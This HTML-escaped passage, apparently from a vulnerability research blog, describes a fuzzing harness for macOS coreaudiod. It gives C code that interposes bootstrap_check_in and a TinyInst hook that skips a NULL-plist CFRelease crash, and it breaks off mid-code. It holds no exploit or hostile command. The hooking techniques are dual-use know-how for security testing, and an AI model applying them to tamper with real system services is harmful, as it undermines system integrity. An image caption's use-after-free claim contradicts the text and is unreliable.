 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In my fuzzing harness&amp;rsquo; case, calling the initialization routines was causing my harness to try to register the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;com.apple.audio.audiohald&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach service with the bootstrap server, which was throwing an error because it was already registered by &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;launchd&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;. Since my harness didn&amp;rsquo;t need to register the Mach service in order to inject messages, (remember, our harness calls the MIG subsystem directly) I decided to mock out the functionality. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;When dealing with pure C functions, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;http://toves.freeshell.org/interpose/&quot;&gt;function interposing&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be used to easily modify a function&amp;rsquo;s behavior. In the example below, I declare a new version of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;bootstrap_check_in&lt;/span&gt;&lt;span&gt;&amp;nbsp;function that just says returns &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span&gt;, effectively &lt;/span&gt;&lt;span&gt;nopping&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;it out while telling the caller that it was successful.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;lt;mach/mach.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;lt;stdarg.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Forward declaration for bootstrap_check_in&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;kern_return_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;bootstrap_check_in(mach_port_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;bootstrap_port,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*service_name,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*service_port);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Custom implementation of bootstrap_check_in&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;kern_return_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;custom_bootstrap_check_in(mach_port_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;bootstrap_port,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*service_name,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*service_port)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Ensure service_port is non-null and set it to a non-zero value&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(service_port)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*service_port&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Set to a non-zero value&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;KERN_SUCCESS;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Return 0 (KERN_SUCCESS)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Interposing array for bootstrap_check_in&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__attribute__((used))&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;replacement;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;replacee;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;interposers[]&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__attribute__((section(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;__DATA,__interpose&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)custom_bootstrap_check_in,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)bootstrap_check_in&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In the case of C++ functions, I used TinyInst&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/TinyInst/blob/master/hook.md&quot;&gt;Hook API&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to modify problematic functionality. In one specific scenario, my fuzzer was crashing the target constantly because the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;&amp;nbsp;function was being called with a &lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt; pointer. Some further analysis told me that this was a non-security relevant bug where a user&amp;rsquo;s input, which was assumed to contain a valid &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;plist&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, was not properly validated. If the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;plist&lt;/span&gt;&lt;span&gt;&amp;nbsp;object was invalid or &lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt;, a downstream function call would contain &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt;&lt;span&gt;, and an abort would &lt;/span&gt;&lt;span&gt;occur.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizEjSYs1ey9AIUnSh6tcp-aexW5Ds8jtwj42wY340Ig4mJeSj9FJ4KvFpjL1zqldJBvteceJ27CXsVfnz6bF2suNspXYb37sEGYVGtRmCC0ChiAS4cxR6MQUn3mW_4pTW-9-MYp5WwtydMAbJkv8N3zuPu3kaaDM4BI3zyMNfFR_6pXuZwf5nJQNj6TPo/s1266/image9.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizEjSYs1ey9AIUnSh6tcp-aexW5Ds8jtwj42wY340Ig4mJeSj9FJ4KvFpjL1zqldJBvteceJ27CXsVfnz6bF2suNspXYb37sEGYVGtRmCC0ChiAS4cxR6MQUn3mW_4pTW-9-MYp5WwtydMAbJkv8N3zuPu3kaaDM4BI3zyMNfFR_6pXuZwf5nJQNj6TPo/s1200/image9.png&quot; border=&quot;0&quot; alt=&quot;A flowchart of disassembled code for a function HALS_SettingsManager::_WriteSetting. Text annotations highlight No Check for NULL Property List before a call to _CFPropertyListCreateDeepCopy. Another annotation points to a jmp _CFRelease instruction, labeled CFRelease&amp;quot; indicating a potential use-after-free or similar memory corruption vulnerability.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart of disassembled code for a function HALS_SettingsManager::_WriteSetting. Text annotations highlight No Check for NULL Property List before a call to _CFPropertyListCreateDeepCopy. Another annotation points to a jmp _CFRelease instruction, labeled CFRelease&amp;quot; indicating a potential use-after-free or similar memory corruption vulnerability.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;So, I wrote the following &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/TinyInst/blob/master/hook.md&quot;&gt;TinyInst hook&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which checked whether the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;plist&lt;/span&gt;&lt;span&gt;&amp;nbsp;object passed into the function was &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;. If so, my hook returned the function call early, bypassing the buggy code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp;HALSWriteSettingHook::OnFunctionEntered() {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;HALS_SettingsManager::_WriteSetting Entered\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp;(!GetRegister(RDX)) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;NULL plist passed as argument, returning to prevent NULL CFRelease\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;Current $RSP: %p\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;, GetRegister(RSP));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp;*return_address;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; RemoteRead((&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)GetRegister(RSP), &amp;amp;return_address, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp;*));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;Current return address: %p\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;, GetReturnAddress());&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;Current $RIP: %p\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;, GetRegister(RIP));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9 VEfNEQsFFH-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SetRegister(RAX, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
